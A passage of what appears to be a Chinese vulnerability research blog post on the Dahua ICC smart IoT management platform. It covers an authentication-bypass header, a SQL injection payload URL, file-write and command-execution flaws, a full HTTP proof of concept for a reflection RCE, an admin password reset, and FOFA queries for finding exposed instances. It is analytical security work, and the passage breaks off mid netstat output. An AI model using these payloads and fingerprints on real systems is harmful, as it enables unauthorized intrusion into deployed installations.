+<p>所以我们可以往&#x2F;opt&#x2F;evo&#x2F;evo-common&#x2F;Evo-discover&#x2F;tomcat&#x2F;srd&#x2F;evo-discover或者&#x2F;opt&#x2F;evo&#x2F;evo-common&#x2F;Evo-discover&#x2F;tomcat&#x2F;srd&#x2F;nacos-sync目录下写jsp文件，然后通过&#x2F;evo-apigw&#x2F;nacos-sync&#x2F;xxx.jsp或&#x2F;evo-apigw&#x2F;evo-discover&#x2F;xxx.jsp去访问jsp文件，这样就可以从任意写提升到RCE。</p>
+<h2 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h2><p>evo-apigw在获取微服务列表时，会单独去掉evo-job，所以没办法在外网访问evo-job了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775790818989-3c390385-db52-49bd-a53d-67d8436b8b13.png" ></p>
+<p>当调试apigw时，在org.springframework.web.servlet.DispatcherServlet#doDispatch打断点，这样一定能停下来。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里针对漏洞挖掘总结一下。</p>
+<p>1、&#x2F;evo-apigw&#x2F;xxx系列接口的命名规则</p>
+<p>在漏洞分析中，经常看到 &#x2F;evo-apigw&#x2F;evo-brm&#x2F;1.0.0&#x2F;xxx 类似的接口。</p>
+<p>以evo-apigw为网关的微服务，其接口命名都是类似的。</p>
+<p>evo-brm这部分，可以看最上面对evo-discover的curl请求列表，也可以看对应微服务的配置文件。</p>
+<p>一般都在config&#x2F;application.properties里，看system.name就行：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775636714227-c16fbc84-adce-4a23-bf41-2d5358e2a89e.png"  alt="img"></p>
+<p>1.0.0这部分也看配置文件application.properties：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775636776839-2ac0a6e2-2c3c-41f3-b1fa-4d3699c971e5.png"  alt="img"></p>
+<p>比上面的版本小是可以的。</p>
+<p>2、oauth认证相关</p>
+<p>oauth认证难绕，只能关注不用认证的接口，一般在相应jar包的oauth.properties文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775636939222-b786f38f-0c1a-4817-9958-cc86117d6a1b.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775636954692-e912f2f0-4642-4a6e-8fdc-6ac06e205adf.png"  alt="img"></p>
+<p>3、&#x2F;evo-runs&#x2F;v1.0&#x2F;xxx</p>
+<p>这个没经过apigw网关。白名单接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.interceptor.url=/v1.0/auths/sysusers/login,/v1.0/receive,/v1.0/push,/v1.0/receive/file,/v1.0/push/file,/v1.0/receive/response/file,/v1.0/health,/v1.0/auths/sysusers/publickey,/v1.0/auths/sysusers/v2/security/questions/*,/v1.0/auths/sysusers/forget/pass/login,/v1.0/auths/sysusers/valid/security/answers,/index.html,/v1.0/ws,/v1.0/auths/sysusers/code/time,/v1.0/auths/sysusers/code/digit,/v1.0/auths/sysusers/code,/v1.0/sys/paramConfigs/account,/v1.0/auths/sysmenus/productInfo/query,/v1.0/rose/switch,/v1.0/auths/sysusers/nonce,/v1.0/module/config/global/query/nvxDB/stat,/v1.0/theme/getlastapply,/v1.0/server/module/encode,/v1.0/certificate/download/ca/selfSign,/v1.0/proTypeInfo/query</span><br></pre></td></tr></table></figure>
+
+<h1 id="鉴权分析"><a href="#鉴权分析" class="headerlink" title="鉴权分析"></a>鉴权分析</h1><h2 id="evo-apigw系列"><a href="#evo-apigw系列" class="headerlink" title="evo-apigw系列"></a>evo-apigw系列</h2><p>通过oauth2协议，且是password模式。</p>
+<p>可以参考官方文档：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Fquickstart.html%23%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81&version=enterprisebase/5.0.17&blank=true" >https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Fquickstart.html%23%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81&amp;version=enterprisebase/5.0.17&amp;blank=true<i class="fas fa-external-link-alt"></i></a></p>
+<p>根据client_id、client_secret、access_token等字段，可以得知，由apigw进行转发的微服务，都是通过oauth2协议鉴权的，且这里使用的是password模式。</p>
+<p>关于oauth协议，可以看：<a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1FL411h7es" >https://www.bilibili.com/video/BV1FL411h7es<i class="fas fa-external-link-alt"></i></a></p>
+<p>最终的鉴权点在org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter#doFilter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775574985324-f262539d-40bd-40c5-b03f-24d2a4ad672b.png"  alt="img"></p>
+<p>能够看到tokenExtractor是BearerTokenExtractor，这也与官方文档中的一致：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775575093818-9faf9b2d-487b-45a5-b742-cabe12e80a2e.png"  alt="img"></p>
+<p>所以说，apigw系列接口的认证安全，就是oauth2的认证安全。想要绕过oauth2，是困难的。所以，若是想访问apigw系列接口，只能想办法获取用户名和密码，以及client_id和client_secret，然后去申请access_token。这显然也是困难的，只能通过其他地方的信息泄露，或是密码重置等方法。如果能知道或重置system用户，那就可以手动去分配client_id等，见：<a class="link"   target="_blank" rel="noopener" href="https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Fquickstart.html%23%E7%94%B3%E8%AF%B7%E8%AE%BF%E9%97%AE%E5%87%AD%E8%AF%81&version=enterprisebase/5.0.17&blank=true" >https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Fquickstart.html%23%E7%94%B3%E8%AF%B7%E8%AE%BF%E9%97%AE%E5%87%AD%E8%AF%81&amp;version=enterprisebase/5.0.17&amp;blank=true<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="evo-run系列"><a href="#evo-run系列" class="headerlink" title="evo-run系列"></a>evo-run系列</h2><p>这个也是漏洞分析中经常出现的一个路由。</p>
+<p>其鉴权白名单在配置文件中：\opt\evo\evo-common\evo-runs\config\application.properties</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775575474602-2babd2b3-6efa-4666-887a-fb6100cdaee1.png"  alt="img"></p>
+<p>鉴权采用Filter方式，主要分析AuthFilter和SessionFilter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775575572907-a36620e4-7e0d-45e4-9205-b527bef683b8.png"  alt="img"></p>
+<p>AuthFilter只对几个接口生效：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775575620116-5a7f8539-6d84-4916-9826-d37e2f7debb9.png"  alt="img"></p>
+<p>其中有出现历史漏洞的&#x2F;receive，&#x2F;push接口</p>
+<p>其doFilter方法也很好绕过，只需要有X-Subject-HeaderFlag: ADAPT请求头，且没有X-Subject-Sign请求头即可：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775575674765-4910362a-300e-4e66-a02d-df813fc0b6ca.png"  alt="img"></p>
+<p>SessionFilter对所有接口生效，但是会放行配置文件中的白名单：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775637575669-6c4d16b1-4d17-412e-ae01-bb5cd0a32823.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775578478184-6395a029-f264-49a9-a18e-3db1bf06665f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775637556675-b8bdd9d0-e8f7-4900-af4a-f171c9e6685c.png"  alt="img"></p>
+<h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>微服务大多是spring boot架构的，所以也可以去一个个调试，在doDispatcher打断点，然后把所有controller mapping提取出来。不过经过我的尝试，这里调试时，表达式的执行有很大限制，最后只能用这个代码去提取：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.StringBuilder()</span><br><span class="line">        .append(</span><br><span class="line">                <span class="built_in">this</span>.getWebApplicationContext()</span><br><span class="line">                        .getBeansOfType(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class)</span><br><span class="line">                        .values()</span><br><span class="line">                        .iterator()</span><br><span class="line">                        .next()</span><br><span class="line">                        .getHandlerMethods()</span><br><span class="line">        )</span><br><span class="line">        .toString()</span><br></pre></td></tr></table></figure>
+
+<p>然后自己手动去整理。</p>
+<p>最终我只搞了一个evo-runs的，见我的仓库：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="ars-list-SQL注入"><a href="#ars-list-SQL注入" class="headerlink" title="&#x2F;ars&#x2F;list SQL注入"></a><strong>&#x2F;ars&#x2F;list SQL注入</strong></h2><p>参考<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Domren/articles/19473055" >https://www.cnblogs.com/Domren/articles/19473055<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里的漏洞接口是：<a class="link"   target="_blank" rel="noopener" href="https://xxxx/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-" >https://XXXX/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-<i class="fas fa-external-link-alt"></i></a></p>
+<p>是evo-arsm这个微服务。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775638075393-77da9d86-cab2-4e06-9e38-4ddcc1be5fee.png"  alt="img"></p>
+<p>这是一个二进制文件，问了一下AI，说是go的编译文件，而且没有oauth认证。</p>
+<p>所以里面的接口都是无鉴权的了，但是笔者并不会逆向，所以只能全部交给AI分析，这里就没法结合具体代码分析了。</p>
+<p>复现没问题：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639353091-04ed46d0-9994-4b02-9ce5-3043189bb63f.png"  alt="img"></p>
+<h2 id="push-receive-RCE-文件上传"><a href="#push-receive-RCE-文件上传" class="headerlink" title="&#x2F;push&amp;&#x2F;receive RCE&amp;文件上传"></a>&#x2F;push&amp;&#x2F;receive RCE&amp;文件上传</h2><p>这是去年护网时候的一个漏洞。</p>
+<p>涉及的微服务是evo-runs。</p>
+<p>com.dahua.evo.runs.controller.agent.MsgDealConrtoller#push：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639515361-57c1559c-2b2a-42ce-9999-f6e3dafd632f.png"  alt="img"></p>
+<p>跟进msgDeal：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639569627-39218d9d-1815-4754-9fbb-ed25a780d608.png"  alt="img"></p>
+<p>这里会调用handler的msgDeal，handler从上面获取，跟进getMsgHandler：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639638090-2e1dea5f-9e4c-4d3c-a1d0-61b495dcd6cf.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639654131-20d3c0ca-25c3-4f80-9df7-7ac3c05f6136.png"  alt="img"></p>
+<p>所以在MsgHandler的实现类中，寻找能够利用的msgDeal方法即可。</p>
+<p>公开POC中给的是com.dahua.evo.runs.agent.receive.handler.module.OssmConfigHandler#msgDeal：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775639927177-0858bbb7-b12b-461e-a297-c28318b54679.png"  alt="img"></p>
+<p>这里有两个利用点，一个是任意文件写入，一个是任意命令执行。</p>
+<p>AgentMsgParam是一开始从请求体里读取的，可控，所以由它生成的CommonAgentParam也是可控的。</p>
+<p>writeMappingFile会向指定路径写指定内容：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775640194867-f31f4ddd-78f5-4c92-9a1c-845d3182c530.png"  alt="img"></p>
+<p>而execute，则会代入Runtime去执行命令：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775640251474-08149ebb-7ac0-4249-b42d-52595a3931b0.png"  alt="img"></p>
+<p>需要注意的是，这里会对command做一次变量代换。比如command是：echo {0}，args是：{“111”}，那么formatCommand后，最终命令会变成：echo 111。所以如果command里出现大括号，得用单引号包裹来进行转义。</p>
+<p>复现：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775641317141-7ed2376e-8e1c-4f7c-9957-68e568fd7e2d.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775641341463-e6e57243-2260-4446-8400-ae9d81aea6fe.png"  alt="img"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="GetClassValue-RCE"><a href="#GetClassValue-RCE" class="headerlink" title="&#x2F;GetClassValue RCE"></a>&#x2F;GetClassValue RCE</h2><p>漏洞接口是：&#x2F;evo-apigw&#x2F;admin&#x2F;API&#x2F;Developer&#x2F;GetClassValue.jsp</p>
+<p>&#x2F;admin对应 admin微服务，在&#x2F;evo-subsystem&#x2F;Evo-video&#x2F;admin目录下。</p>
+<p>&#x2F;API 是固定的 servlet-path，见配置文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775654720246-33b00a69-d731-4242-8589-9a922503b2ed.png"  alt="img"></p>
+<p>所以真正对应到controller的，应该是&#x2F;Developer&#x2F;GetClassValue，.jsp不知道是做什么的，也许是绕过nginx规则？当经过apigw转发后，.jsp会被rewrite掉，最后请求的还是&#x2F;Developer&#x2F;GetClassValue。</p>
+<p>com.dahua.admin.restapi.api.developer.DeveloperController#getCache：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655017853-37cbe66d-48d2-4731-95bf-a67da2a86192.png"  alt="img"></p>
+<p>能通过反射调用任意public方法，所以找一个能利用的方法就行。</p>
+<p>这里找到com.dahua.admin.util.RuntimeUtil#syncexecReturnExitValue：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655335092-93470042-9769-46bd-8607-eb3480f50f40.png"  alt="img"></p>
+<p>最终POC：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/evo-apigw/admin/API/Developer/GetClassValue.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>159</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;data&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-prolog">        <span class="string">&quot;clazzName&quot;</span>: <span class="string">&quot;com.dahua.admin.util.RuntimeUtil&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">        <span class="string">&quot;methodName&quot;</span>: <span class="string">&quot;syncexecReturnInputStream&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">        <span class="string">&quot;fieldName&quot;</span>: [<span class="string">&quot;id&quot;</span>]</span></span><br><span class="line"><span class="language-prolog">    &#125;</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>我这边的环境已经修复了，所以没法利用成功，看网上的截图，应该是有直接回显结果的。</p>
+<p>修复：</p>
+<p>admin&#x2F;resources&#x2F;oauth.properties中，会对上面的URL做认证：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655465154-bed1ca88-cc54-4733-b39d-1d851964702f.png"  alt="img"></p>
+<h2 id="system用户密码重置漏洞"><a href="#system用户密码重置漏洞" class="headerlink" title="system用户密码重置漏洞"></a>system用户密码重置漏洞</h2><p>这里的漏洞接口是：&#x2F;evo-apigw&#x2F;evo-runs-adapt&#x2F;1.0.0&#x2F;receive</p>
+<p>没错，跟evo-runs的一样，也是&#x2F;receive，在配置文件中放行：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655913573-0e5260eb-ef8f-4af8-b854-7e1b0ab3de78.png"  alt="img"></p>
+<p>controller的类名都一样：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655942905-6aaeca33-f007-446f-a0e4-acfda3a02e12.png"  alt="img"></p>
+<p>所以利用方式也和上面的一样。</p>
+<p>看一下这次的handler，com.dahua.evo.runsadapt.business.handler.manage.RestManagePwdHandler#msgDeal：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775656007957-47399c39-4106-4ec5-98f7-a417eb7c3cf1.png"  alt="img"></p>
+<p>名称很直接了，就叫重置管理员密码。看上去还是请求brm服务重置的。</p>
+<p>把evo-brm.jar放进jadx，搜索一下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775656629005-5ea03062-8901-40e2-90a3-3f048307a782.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775656660864-29dc27fb-5c43-43d7-9796-52433ab4f3d8.png"  alt="img"></p>
+<p>这里有一点疑惑的是，为什么evo-runs-adapt生成的随机token，能通过evo-brm微服务的oauth认证。</p>
+<p>好吧，其实就是写在evo-brm的规则里：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775656926306-bf0b342f-cca5-467d-b55f-5dfa6b94cba2.png"  alt="img"></p>
+<p>那很奇怪了，为什么不直接访问&#x2F;evo-apigw&#x2F;evo-brm&#x2F;1.0.0&#x2F;user&#x2F;password-reset呢？</p>
+<p>好吧，又有反转，直接调是不行的，因为在evo-brm中，会携带evo-runs-adapt发送过来token进行一次回调：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775657312202-0202aa65-4c7f-4142-8460-7d44fd95d521.png"  alt="img"></p>
+<p>这里顺带问了一下AI，这里数据库密码的加密方式是怎么样的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775657494741-950d8a2f-44ff-43ce-b061-74bd56c790d1.png"  alt="img"></p>
+<p>看来这个密码是很难解密了。</p>
+<p>当重置完后，用户名和密码为system&#x2F;123456 。</p>
+<p>这个时候，我们就能登录后台，然后跟进官方文档的鉴权过程，去申请client凭证，最后想oauth服务发包，得到access_token：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775657659706-125deed0-3f93-4dfa-b1fc-efda99f8d4f8.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775657688714-b364f730-329e-42f9-8424-bb88c4514ad4.png"  alt="img"></p>
+<p>好像直接登录也能抓包在请求头看到token，不过我这边环境过期了，登录不了，不知道行不行。</p>
+<p>拿到token后，就可以向需要认证的微服务发起访问了，此时攻击面很大，这里留给读者自己去找。</p>
+<p>给两个接口作为提示：&#x2F;evo-brm&#x2F;1.2.0&#x2F;user&#x2F;menu&#x2F;upload&#x2F;img、&#x2F;admin&#x2F;API&#x2F;capture&#x2F;batchDownloadCapturePic</p>
+<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><p>这里可以使用：<a class="link"   target="_blank" rel="noopener" href="https://github.com/R4gd0ll/I-Wanna-Get-All" >https://github.com/R4gd0ll/I-Wanna-Get-All<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以在工具中设置代理，然后抓包看请求，据此去分析漏洞：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775655567762-11fb3358-e535-467a-9a9b-5ea0f78376a3.png"  alt="img"></p>
+<p>不过不知道是版本原因还是什么，这里有很多漏洞，我感觉根本利用不了，都没这个接口。</p>
+<h2 id="漏洞挖掘思路"><a href="#漏洞挖掘思路" class="headerlink" title="漏洞挖掘思路"></a>漏洞挖掘思路</h2><p>以下的思路只是个人最浅薄的一点见解，仅供参考！</p>
+<p>不知道新版本修了哪些，这里只能给出基于现版本的挖掘思路。</p>
+<p>evo-runs，继续在白名单找能利用的controller（不过似乎没有能用的了）；继续找能利用的handler（不知道新版本有没有禁&#x2F;receive系列接口，禁了话也没用了）。</p>
+<p>evo-apigw系列微服务，看看oauth配置文件里放行的接口有没有能利用的。</p>
+<p>各种二进制起的服务，逆向分析，看看有没有存在漏洞。（这个感觉还挺有希望）</p>
+<p>关注nginx配置里其他端口的服务能不能访问到。</p>
+<h1 id="应用指纹"><a href="#应用指纹" class="headerlink" title="应用指纹"></a>应用指纹</h1><p>参考<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/priv/p/19296980" >https://www.cnblogs.com/priv/p/19296980<i class="fas fa-external-link-alt"></i></a></p>
+<p>fofa语法：<code>icon_hash=&quot;-1935899595&quot;</code>、<code>title=&quot;智能物联综合管理平台&quot;</code>、app&#x3D;”dahua-智能物联综合管理平台”</p>
+<p>title&#x2F;body中关键字：（这个title是强特征，在源码中显示是这样的三个点）、<code>客户端会小于800</code>、<code>智能物联综合管理平台</code>、<code>智慧物联运营管理中心</code>、<code>大华 ICC 智能物联综合管理平台</code>、<code>浩睿智能物联综合管理平台</code></p>
+<p>版权信息：<code>©2019大华股份浙ICP07004180浙公网安备33010802003424号</code></p>
+<h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><h2 id="断点失败"><a href="#断点失败" class="headerlink" title="断点失败"></a>断点失败</h2><p>在调试brm鉴权的时候，明明能连上远程调试，却死活断不下来点。</p>
+<p>后面去ps -ef | grep brm，netstat -anp | grep xxx 看了一下对应进程开了哪些端口时，才发现，原来新开的debug brm进程只开了一个12002调试端口，其他端口还是原本的brm服务开的。</p>
+<p>当时命令的结果：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@dahuatech</span><span class="punctuation">:</span>~<span class="comment"># netstat -anp | grep -E &quot;17688|24091&quot;</span></span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">12002</span>    <span class="number">192.168</span>.<span class="number">26.80</span><span class="punctuation">:</span><span class="number">21248</span>     ESTABLISHED <span class="number">17688</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="number">8918</span>                 <span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span>*                    LISTEN      <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="number">8941</span>                 <span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span>*                    LISTEN      <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">49964</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">3306</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55233</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">47779</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">3306</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55458</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">5673</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6      <span class="number">86</span>      <span class="number">0</span> <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">43729</span>    <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">8945</span>     CLOSE_WAIT  <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55231</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55225</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55229</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55227</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">57244</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">3306</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">55223</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span 